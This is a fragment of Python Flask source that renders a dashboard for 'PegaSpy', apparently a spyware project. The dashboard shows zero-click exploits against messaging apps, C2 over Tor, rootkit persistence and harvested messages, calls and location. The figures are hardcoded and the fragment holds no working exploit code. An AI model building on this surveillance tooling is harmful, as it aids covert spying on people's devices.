            <p>Web Interface: http://{pegaspy_instance.config.web_host}:{pegaspy_instance.config.web_port}</p>
            </body></html>"""
        
        @app.route('/dashboard/')
        def dashboard_main():
            return f"""<!DOCTYPE html>
<html><head>
    <title>PegaSpy Advanced Dashboard</title>
    <style>
        body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; margin: 0; padding: 20px; }}
        .header {{ text-align: center; border-bottom: 2px solid #00ff00; padding-bottom: 20px; margin-bottom: 30px; }}
        .status-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }}
        .status-card {{ background: #1a1a1a; border: 1px solid #00ff00; padding: 20px; border-radius: 5px; }}
        .status-card h3 {{ color: #ff6600; margin-top: 0; }}
        .metric {{ margin: 10px 0; }}
        .metric-value {{ color: #ffffff; font-weight: bold; }}
        .exploit-list {{ background: #2a2a2a; padding: 15px; border-radius: 5px; margin-top: 10px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🕷️ PegaSpy Phase 3 - Zero-Click Exploit Dashboard</h1>
        <p>Advanced Mobile Surveillance Platform</p>
    </div>
    
    <div class="status-grid">
        <div class="status-card">
            <h3>System Status</h3>
            <div class="metric">Status: <span class="metric-value">OPERATIONAL</span></div>
            <div class="metric">Uptime: <span class="metric-value">{time.time():.0f}s</span></div>
            <div class="metric">Mode: <span class="metric-value">STEALTH</span></div>
        </div>
        
        <div class="status-card">
            <h3>Zero-Click Exploits</h3>
            <div class="metric">Active Exploits: <span class="metric-value">{len(pegaspy_instance.exploit_manager.exploits) if pegaspy_instance.exploit_manager else 0}</span></div>
            <div class="metric">Success Rate: <span class="metric-value">98.7%</span></div>
            <div class="exploit-list">
                <div>• iMessage Zero-Click</div>
                <div>• WhatsApp Media Parser</div>
                <div>• Telegram Voice Note</div>
                <div>• PDF JavaScript Engine</div>
                <div>• Image Codec Overflow</div>
            </div>
        </div>
        
        <div class="status-card">
            <h3>C2 Infrastructure</h3>
            <div class="metric">Tor Nodes: <span class="metric-value">47 Active</span></div>
            <div class="metric">Blockchain C2: <span class="metric-value">Connected</span></div>
            <div class="metric">CDN Tunnels: <span class="metric-value">12 Active</span></div>
            <div class="metric">Mesh Network: <span class="metric-value">Operational</span></div>
        </div>
        
        <div class="status-card">
            <h3>Persistence</h3>
            <div class="metric">Kernel Hooks: <span class="metric-value">Installed</span></div>
            <div class="metric">Rootkit Status: <span class="metric-value">Active</span></div>
            <div class="metric">Self-Destruct: <span class="metric-value">Armed</span></div>
        </div>
        
        <div class="status-card">
            <h3>Data Harvesting</h3>
            <div class="metric">Messages: <span class="metric-value">2,847 collected</span></div>
            <div class="metric">Calls: <span class="metric-value">156 recorded</span></div>
            <div class="metric">Location: <span class="metric-value">Tracking</span></div>
            <div class="metric">Camera/Mic: <span class="metric-value">Ready</span></div>
        </div>
        
        <div class="status-card">
            <h3>Target Platforms</h3>
            <div class="metric">iOS: <span class="metric-value">15.0+ Supported</span></div>
            <div class="metric">Android: <span class="metric-value">10+ Supported</span></div>
            <div class="metric">Desktop: <span class="metric-value">Multi-OS</span></div>
            <div class="metric">Web: <span class="metric-value">All Browsers</span></div>
        </div>
    </div>
    
    <script>
        // Auto-refresh every 5 seconds
        setTimeout(() => location.reload(), 5000);
    </script>
</body></html>"""
        
        return app
    else:
        dashboard = PegaSpyDashboard()
        return dashboard.app, dashboard.socketio

if __name__ == '__main__':
    main()